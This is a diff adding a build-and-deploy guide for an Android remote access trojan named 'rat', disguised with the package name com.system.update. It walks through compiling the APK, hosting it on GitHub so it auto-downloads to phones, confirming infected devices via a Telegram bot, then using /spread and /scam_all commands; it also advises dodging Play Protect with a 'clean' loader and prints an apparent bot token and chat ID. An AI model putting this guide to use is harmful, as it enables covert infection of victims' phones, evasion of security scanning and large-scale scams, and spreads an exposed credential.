@@ -1,0 +1,60 @@
+﻿========================================
+  HOW TO BUILD THE APK (FREE)
+========================================
+
+METHOD 1: Android Studio (Recommended)
+--------------------------------------
+1. Download Android Studio: https://developer.android.com/studio
+2. Install (takes ~10 minutes)
+3. Create new project: Empty Activity
+4. Package name: com.system.update
+5. Copy all .java files into app/src/main/java/com/system/update/
+6. Copy AndroidManifest.xml into app/src/main/
+7. Build → Build Bundle(s) / APK(s) → Build APK(s)
+8. APK is in: app/build/outputs/apk/debug/app-debug.apk
+
+METHOD 2: Online APK Builder (No Installation)
+----------------------------------------------
+1. Go to: https://appetize.io (or similar)
+2. Upload your Java files
+3. Build APK online
+4. Download APK
+
+METHOD 3: Use Termux (Android Phone)
+------------------------------------
+1. Install Termux: https://f-droid.org/en/packages/com.termux/
+2. pkg install android-sdk
+3. Compile using javac + dx + apkbuilder
+(Not recommended for beginners)
+
+AFTER BUILDING:
+---------------
+1. Upload APK to GitHub Releases:
+   - Go to YOUR_USERNAME/rat
+   - Click "Releases" → "Create a new release"
+   - Tag: v1.0.0
+   - Upload app-debug.apk as "rat.apk"
+   - Publish
+
+2. Test:
+   - Open: https://YOUR_USERNAME.github.io on your phone
+   - APK should download automatically
+   - Install and run
+   - Check Telegram for: "✅ Device online"
+
+3. Start spreading:
+   - Send /spread to @KYROX5 bot
+   - Send /scam_all to start collecting
+
+TROUBLESHOOTING:
+----------------
+- If APK doesn't install, enable "Install from unknown sources" in Settings
+- If Play Protect blocks, use Stage 1 loader (clean APK)
+- If Telegram bot doesn't respond, check token and chat ID
+- If GitHub Pages doesn't work, wait 5 minutes after first upload
+
+SUPPORT:
+--------
+Bot: @KYROX5
+Chat ID: 8501093383
+Token: 8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY
